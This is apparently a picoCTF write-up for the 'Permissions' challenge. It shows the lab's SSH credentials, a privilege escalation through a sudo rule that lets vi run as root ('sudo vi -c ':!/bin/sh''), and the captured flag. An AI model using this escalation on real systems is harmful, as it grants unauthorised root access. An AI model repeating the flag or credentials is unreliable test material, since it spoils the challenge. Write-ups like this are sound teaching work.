# Permissions

## Overview
- **100 points**
- **General Skills**
- **Author: Geoffrey Njogu**

## Description
Can you read files in the root file?

Additional details will be available after launching your challenge instance.

Instance:
```
main server:
ssh -p 62758
picoplayer@saturn.picoctf.net
Password: j4ks-9nxB-
Can you login and read the root file?
```

## Approach
This is a bit tricky on my part, since I have 0 knowledge in Vim. 

I was stuck playing around with the files using **'cd'** and **'ls'.** I even tried using ls -al to show permissions, but that didn't work. 
I tried opening files using **'sudo'**, but that didn't work as well. However, what intrigued me after is:
```
$ sudo -l # I ran with -l to see what are the files that I'm permitted to execute with sudo
[sudo] password for picoplayer:
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
```

So this all makes sense now, with **'vim'** in one of the tags. I researched a lot of commands until I finally arrived with this.
```
$ sudo vi -c ':!/bin/sh'

# whoami
root
```

What the code did was to use Vim text editor (vi) to execute shell (:!/bin/sh) using sudo or with superuser privileges.

Now that we have the root access, I went to the root directory and opened 'challenge' folder.
```
# ls
bin   challenge  etc   lib    lib64   media  opt   root  sbin  sys  usr
boot  dev        home  lib32  libx32  mnt    proc  run   srv   tmp  var
# cd challenge
# ls
metadata.json
# cat metadata.json
{"flag": "picoCTF{uS1ng_v1m_3dit0r_021d10ab}", "username": "picoplayer", "password": "j4ks-9nxB-"}#
```

Flag:
```
picoCTF{uS1ng_v1m_3dit0r_021d10ab}
```
